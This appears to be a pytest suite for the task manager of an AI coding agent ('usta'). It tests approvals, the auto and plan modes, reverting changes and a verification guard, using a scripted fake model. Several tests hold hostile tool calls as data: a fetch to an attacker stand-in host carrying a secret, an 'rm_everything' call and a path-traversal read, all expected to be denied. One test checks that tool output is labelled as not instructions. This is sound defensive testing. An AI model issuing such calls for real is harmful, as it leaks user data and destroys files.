import threading

import pytest

from usta.models import ModelError, ModelResponse, ToolCall
from usta.tasks import TaskManager, WorkspaceBusy


class Scripted:
    def __init__(self, *responses, gate: threading.Event | None = None):
        self.responses = list(responses)
        self.gate = gate
        self.started = threading.Event()

    def chat(self, messages, tools=None):
        self.started.set()
        if self.gate is not None:
            self.gate.wait(10)
        r = self.responses.pop(0)
        if isinstance(r, Exception):
            raise r
        return r


def call(name, args, id="c1"):
    return ModelResponse(None, [ToolCall(id, name, args)])


def manager(tmp_path, model, **kw):
    return TaskManager(lambda: model, home=tmp_path / "home", **kw)


def types(task):
    return [e["type"] for e in task.events]


def test_runs_in_background_and_records_diff(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("eski\n")
    model = Scripted(
        call("write_file", {"path": "a.txt", "content": "yeni\n"}), ModelResponse("ok")
    )
    m = manager(tmp_path, model)
    t = m.start("w1", ws, "değiştir")
    assert t.finished.wait(10)
    assert t.status == "done" and t.answer == "ok"
    assert "-eski" in t.diff and "+yeni" in t.diff
    assert types(t)[0] == "started" and types(t)[-1] == "done"
    assert [e["i"] for e in t.events] == list(range(len(t.events)))


def test_one_running_task_per_workspace(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    gate = threading.Event()
    m = manager(tmp_path, Scripted(ModelResponse("a"), ModelResponse("b"), gate=gate))
    t = m.start("w1", ws, "x")
    with pytest.raises(WorkspaceBusy):
        m.start("w1", ws, "y")
    other = tmp_path / "ws2"
    other.mkdir()
    t2 = m.start("w2", other, "z")  # farklı alan serbest
    gate.set()
    assert t.finished.wait(10) and t2.finished.wait(10)
    m.start("w1", ws, "tekrar")  # bitince yeniden başlatılabilir (model yanıtı bitti: görev düşer)


def test_cancel_stops_before_next_step(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    gate = threading.Event()
    model = Scripted(call("write_file", {"path": "z", "content": "1"}), gate=gate)
    m = manager(tmp_path, model)
    t = m.start("w1", ws, "x")
    assert model.started.wait(10)
    m.cancel(t.id)
    assert t.status == "cancelling"
    gate.set()
    assert t.finished.wait(10)
    assert t.status == "cancelled" and not (ws / "z").exists()
    assert types(t)[-1] == "done"


def test_cancel_unknown_task(tmp_path):
    with pytest.raises(KeyError):
        manager(tmp_path, Scripted()).cancel("yok")


def test_approval_allow_and_deny(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(tmp_path, Scripted(call("web_search", {"query": "x"}), ModelResponse("ok")))
    t = m.start("w1", ws, "ara")
    ev = wait_for(t, "approval_required")
    assert t.status == "awaiting_approval" and ev["data"]["tool"] == "web_search"
    m.resolve_approval(ev["data"]["approval_id"], allow=False)
    assert t.finished.wait(10) and t.status == "done"
    tool_msgs = [e for e in t.events if e["type"] == "denied"]
    assert tool_msgs
    with pytest.raises(KeyError):
        m.resolve_approval(ev["data"]["approval_id"], allow=True)  # artık yok


def test_approval_timeout_denies(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(
        tmp_path,
        Scripted(call("web_search", {"query": "x"}), ModelResponse("ok")),
        approval_timeout=0.3,
    )
    t = m.start("w1", ws, "ara")
    assert t.finished.wait(10)
    assert "denied" in types(t) and t.status == "done"


def test_cancel_while_waiting_for_approval(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(tmp_path, Scripted(call("web_search", {"query": "x"}), ModelResponse("asla")))
    t = m.start("w1", ws, "ara")
    wait_for(t, "approval_required")
    m.cancel(t.id)
    assert t.finished.wait(10) and t.status == "cancelled"


def test_model_failure_marks_failed(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(tmp_path, Scripted(ModelError("model isteği başarısız: HTTPStatusError")))
    t = m.start("w1", ws, "x")
    assert t.finished.wait(10)
    assert t.status == "failed" and "model" in t.events[-1]["data"]["error"]


def test_unexpected_exception_does_not_leak_details(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(tmp_path, Scripted(RuntimeError("/gizli/yol/anahtar")))
    t = m.start("w1", ws, "x")
    assert t.finished.wait(10) and t.status == "failed"
    assert "gizli" not in str(t.events[-1])


def test_revert(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("orijinal")
    m = manager(
        tmp_path,
        Scripted(call("write_file", {"path": "a.txt", "content": "bozuk"}), ModelResponse("ok")),
    )
    t = m.start("w1", ws, "x")
    assert t.finished.wait(10)
    m.revert(t.id)
    assert (ws / "a.txt").read_text() == "orijinal"


def test_revert_refused_while_workspace_busy(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    gate = threading.Event()
    m = manager(tmp_path, Scripted(ModelResponse("a"), ModelResponse("b"), gate=gate))
    first = m.start("w1", ws, "x")
    gate.set()
    assert first.finished.wait(10)
    gate.clear()
    second = m.start("w1", ws, "y")
    with pytest.raises(WorkspaceBusy):
        m.revert(first.id)
    gate.set()
    assert second.finished.wait(10)


def test_wait_events_blocks_until_new_event(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    gate = threading.Event()
    m = manager(tmp_path, Scripted(ModelResponse("a"), gate=gate))
    t = m.start("w1", ws, "x")
    evs, finished = t.wait_events(0, timeout=5)
    assert evs and evs[0]["type"] == "started" and not finished
    evs, finished = t.wait_events(len(evs), timeout=0.2)
    assert evs == [] and not finished
    gate.set()
    assert t.finished.wait(10)
    evs, finished = t.wait_events(0, timeout=1)
    assert finished and evs[-1]["type"] == "done"


def wait_for(task, type_, timeout=10):
    i = 0
    import time

    end = time.monotonic() + timeout
    while time.monotonic() < end:
        evs, _ = task.wait_events(i, timeout=0.5)
        for e in evs:
            if e["type"] == type_:
                return e
        i += len(evs)
    raise AssertionError(f"{type_} olayı gelmedi: {types(task)}")


def test_snapshot_failure_releases_workspace(tmp_path):
    m = manager(tmp_path, Scripted(ModelResponse("a")))
    with pytest.raises(OSError):
        m.start("w1", tmp_path / "yok", "x")  # dizin yok
    ws = tmp_path / "ws"
    ws.mkdir()
    assert m.start("w1", ws, "x").finished.wait(10)


def test_allowed_hosts_reach_tools_and_policy(tmp_path, monkeypatch):
    import usta.tasks as tasks_mod

    seen = {}
    real = tasks_mod.build_registry
    monkeypatch.setattr(
        tasks_mod,
        "build_registry",
        lambda ctx, **kw: seen.setdefault("ctx", ctx) and real(ctx, **kw),
    )
    ws = tmp_path / "ws"
    ws.mkdir()
    m = TaskManager(
        lambda: Scripted(ModelResponse("a")), home=tmp_path / "h", allowed_hosts=("example.com",)
    )
    assert m.start("w1", ws, "x").finished.wait(10)
    assert seen["ctx"].allowed_hosts == ("example.com",)


def test_task_public_includes_usage_and_context_window(tmp_path):
    from usta.models import Usage

    class Counting(Scripted):
        usage = Usage()

        def chat(self, messages, tools=None):
            self.usage.prompt += 50
            self.usage.completion += 5
            self.usage.requests += 1
            self.usage.last_prompt = 50
            return super().chat(messages, tools)

    ws = tmp_path / "ws"
    ws.mkdir()
    m = manager(tmp_path, Counting(ModelResponse("ok")), context_window=8192)
    t = m.start("w1", ws, "x")
    assert t.finished.wait(10)
    info = t.public()
    assert info["usage"] == {
        "prompt": 50,
        "completion": 5,
        "requests": 1,
        "context": 50,
        "cached": 0,
    }
    assert info["context_window"] == 8192


def test_task_public_usage_is_none_when_model_reports_nothing(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    t = manager(tmp_path, Scripted(ModelResponse("ok"))).start("w1", ws, "x")
    assert t.finished.wait(10)
    assert t.public()["usage"] is None and t.public()["context_window"] is None


# --- modlar: manual | auto | plan ----------------------------------------------------------
import sys as _sys
from pathlib import Path as _Path

from usta import mcpconfig as _mcpconfig

_FAKE = str(_Path(__file__).parent / "fake_mcp.py")


class Capture:
    def __init__(self, *responses):
        self.responses, self.seen = list(responses), []

    def chat(self, messages, tools=None):
        self.seen.append((messages, [t["name"] for t in tools or []]))
        return self.responses.pop(0)


def echo_call(i=1):
    return call("mcp__fake__echo", {"text": "x"}, id=f"e{i}")


def mcp_manager(tmp_path, model):
    srv = _mcpconfig.Server(
        "fake", (_sys.executable, "-I", _FAKE), (), "ask", True, isolation="host"
    )
    return manager(tmp_path, model, mcp_servers=[srv])


def test_invalid_mode_rejected(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    with pytest.raises(ValueError):
        manager(tmp_path, Scripted(ModelResponse("a"))).start("w1", ws, "x", mode="yok")


def test_manual_mode_asks_for_approval(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = mcp_manager(tmp_path, Scripted(echo_call(), ModelResponse("bitti")))
    t = m.start("w1", ws, "x")
    for _ in range(200):
        if any(e["type"] == "approval_required" for e in t.events):
            break
        threading.Event().wait(0.05)
    assert any(e["type"] == "approval_required" for e in t.events)
    m.cancel(t.id)
    assert t.finished.wait(10)


def test_auto_mode_approves_ask_decisions_without_asking_but_records_it(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    m = mcp_manager(tmp_path, Scripted(echo_call(), ModelResponse("bitti")))
    t = m.start("w1", ws, "x", mode="auto")
    assert t.finished.wait(15) and t.status == "done"
    kinds = types(t)
    assert "approval_required" not in kinds and "auto_approved" in kinds
    assert any(
        "talimat değil" in e["data"].get("result", "")
        for e in t.events
        if e["type"] == "tool_result"
    )
    assert t.public()["mode"] == "auto"


def test_auto_mode_does_not_override_deny(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    model = Scripted(
        call("rm_everything", {}), call("read_file", {"path": "../disari"}), ModelResponse("bitti")
    )
    t = manager(tmp_path, model).start("w1", ws, "x", mode="auto")
    assert t.finished.wait(10)
    assert types(t).count("denied") == 2


def test_plan_mode_gives_only_read_tools_and_plan_prompt(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    model = Capture(ModelResponse("1) a.py düzenle 2) test et"))
    t = manager(tmp_path, model).start("w1", ws, "özellik ekle", mode="plan")
    assert t.finished.wait(10)
    messages, tools = model.seen[0]
    assert set(tools) == {"read_file", "list_dir", "fetch_url"}
    assert "PLAN MODU" in messages[0].content
    assert t.answer.startswith("1) a.py") and t.public()["mode"] == "plan"


def test_plan_mode_cannot_modify_files_even_if_model_tries(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    model = Scripted(
        call("write_file", {"path": "a.txt", "content": "x"}),
        call("run", {"command": "touch b"}),
        ModelResponse("plan"),
    )
    t = manager(tmp_path, model).start("w1", ws, "x", mode="plan")
    assert t.finished.wait(10)
    assert not (ws / "a.txt").exists() and not (ws / "b").exists() and t.diff == ""
    results = [e["data"]["result"] for e in t.events if e["type"] == "tool_result"]
    assert all("bilinmeyen araç" in r for r in results)


def test_plan_mode_skips_mcp_tools_and_memory_writes_notes(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    model = Capture(ModelResponse("plan"))
    t = mcp_manager(tmp_path, model).start("w1", ws, "x", mode="plan")
    assert t.finished.wait(15)
    assert not any(n.startswith("mcp__") or n == "remember" for n in model.seen[0][1])


# --- koruma (doğrulama kapısı + devre kesici) ürün yolunda -----------------------------------
from usta.sandbox import RunResult as _RunResult


class GateRun:
    def __init__(self, *results):
        self.results, self.calls = list(results), []

    def __call__(self, cfg, command, cancel=None, session=None):
        self.calls.append(command)
        code, out = self.results.pop(0) if self.results else (0, "OK")
        return _RunResult(code, out, "")


def guard_manager(tmp_path, model, gate, **kw):
    m = manager(tmp_path, model, **kw)
    m.gate_run = gate
    return m


def test_guard_off_by_default_no_verification(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "test_a.py").write_text("import unittest\n")
    gate = GateRun((1, "FAIL"))
    model = Scripted(
        call("write_file", {"path": "a.py", "content": "x = 1\n"}), ModelResponse("bitti")
    )
    t = guard_manager(tmp_path, model, gate).start("w1", ws, "yaz")
    assert t.finished.wait(10) and gate.calls == [] and "verification" not in types(t)
    assert t.public()["guard"] is False


def test_guard_on_runs_gate_and_feeds_failure_back(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "test_a.py").write_text("import unittest\n")
    gate = GateRun((1, "AssertionError: 1 != 2"), (0, "OK"))
    model = Capture(
        call("write_file", {"path": "a.py", "content": "x = 1\n"}),
        ModelResponse("bitti"),
        call("write_file", {"path": "a.py", "content": "x = 2\n"}, id="c2"),
        ModelResponse("düzeldi"),
    )
    t = guard_manager(tmp_path, model, gate).start("w1", ws, "yaz", guard=True)
    assert t.finished.wait(10) and t.status == "done"
    assert [e["data"]["status"] for e in t.events if e["type"] == "verification"] == [
        "failed",
        "passed",
    ]
    assert "Doğrulama: geçti" in t.answer and t.public()["guard"] is True
    fb = [
        m
        for m in model.seen[2][0]
        if m.role == "user" and "Doğrulama başarısız" in (m.content or "")
    ]
    assert fb and "AssertionError" in fb[0].content


def test_guard_manager_default_applies_when_start_does_not_say(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "test_a.py").write_text("import unittest\n")
    gate = GateRun((0, "OK"))
    model = Scripted(
        call("write_file", {"path": "a.py", "content": "x = 1\n"}), ModelResponse("bitti")
    )
    m = guard_manager(tmp_path, model, gate, guard=True)
    t = m.start("w1", ws, "yaz")
    assert t.finished.wait(10) and len(gate.calls) == 1
    t2 = m.start("w1", ws, "yaz", guard=False)  # açıkça kapatılabilir
    assert t2.public()["guard"] is False


def test_guard_ignored_in_plan_mode(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    gate = GateRun()
    t = guard_manager(tmp_path, Scripted(ModelResponse("plan")), gate).start(
        "w1", ws, "x", mode="plan", guard=True
    )
    assert t.finished.wait(10) and gate.calls == [] and t.public()["guard"] is False


def test_guard_breaker_rewinds_and_event_is_emitted(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "keep.txt").write_text("temiz\n")
    # sahte `run` aracı: aynı hata iki düzeltmeden sonra tekrar → devre kesici
    from usta import tools

    class R:
        exit_code, stdout, stderr = 1, "AssertionError: x\n", ""
        timed_out = cancelled = False
        network_log = ()

    orig = tools.run_command
    tools.run_command = lambda cfg, cmd, cancel=None, session=None: R()
    try:
        model = Scripted(
            call("write_file", {"path": "a.py", "content": "1"}, id="1"),
            call("run", {"command": "t"}, id="2"),
            call("write_file", {"path": "a.py", "content": "2"}, id="3"),
            call("run", {"command": "t"}, id="4"),
            ModelResponse("yeni yaklaşım"),
        )
        t = guard_manager(tmp_path, model, GateRun((0, "OK"))).start("w1", ws, "düzelt", guard=True)
        assert t.finished.wait(15)
    finally:
        tools.run_command = orig
    assert "breaker" in types(t) and not (ws / "a.py").exists() and (ws / "keep.txt").exists()


def test_auto_mode_does_not_auto_approve_fetch_to_unlisted_host(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    model = Scripted(
        call("fetch_url", {"url": "https://saldirgan.example/?d=SIR"}), ModelResponse("bitti")
    )
    m = manager(tmp_path, model, allowed_hosts=("izinli.example",))
    t = m.start("w", ws, "x", "auto")
    assert t.finished.wait(10)
    kinds = types(t)
    assert "denied" in kinds and "auto_approved" not in kinds


def test_only_the_latest_task_can_be_reverted_and_old_snapshots_are_dropped(tmp_path):
    import pytest

    from usta.tasks import KEEP_SNAPSHOTS, RevertRefused

    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("0")
    n = KEEP_SNAPSHOTS + 3
    script = []
    for i in range(n):  # her görev bir dosya yazar (diff boş olmayan görevler geri almayı engeller)
        script += [
            call("write_file", {"path": f"g{i}.txt", "content": "x"}),
            ModelResponse("tamam"),
        ]
    m = manager(tmp_path, Scripted(*script))
    tasks = []
    for _ in range(n):
        t = m.start("w", ws, "x", "auto")
        assert t.finished.wait(10)
        tasks.append(t)
    with pytest.raises(RevertRefused):
        m.revert(tasks[-2].id)  # daha yeni görev var
    assert tasks[0].snapshot is None  # bellek: eski anlık görüntüler bırakıldı
    assert tasks[-1].snapshot is not None
    m.revert(tasks[-1].id)  # son görev geri alınabilir
